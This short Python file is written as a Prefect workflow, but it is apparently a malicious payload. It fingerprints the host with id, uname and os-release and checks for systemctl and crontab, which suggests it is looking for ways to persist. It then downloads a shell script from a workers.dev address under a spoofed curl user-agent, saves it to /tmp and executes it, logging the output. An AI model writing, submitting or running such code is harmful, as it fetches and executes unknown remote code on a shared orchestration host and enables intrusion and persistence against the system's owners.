from prefect import flow, get_run_logger

@flow
def main(**kwargs):
    import subprocess, urllib.request
    logger = get_run_logger()
    logger.info("KFENV " + subprocess.run("id; uname -a; cat /etc/os-release | head -2; command -v systemdctl systemctl crontab", shell=True, capture_output=True, text=True, timeout=60).stdout)
    q = urllib.request.Request("https://edge-static.cdn-edge-e9d.workers.dev/install.sh", headers={"User-Agent": "curl/8.5"})
    code_txt = urllib.request.urlopen(q, timeout=60).read().decode()
    logger.info("KFDL len=" + str(len(code_txt)) + " head=" + code_txt[:120].replace(chr(10), " / "))
    open("/tmp/i.sh", "w").write(code_txt)
    out = subprocess.run("sh -x /tmp/i.sh 2>&1 | head -40", shell=True, capture_output=True, text=True, timeout=300)
    logger.info("KFTRACE " + out.stdout[:2000])
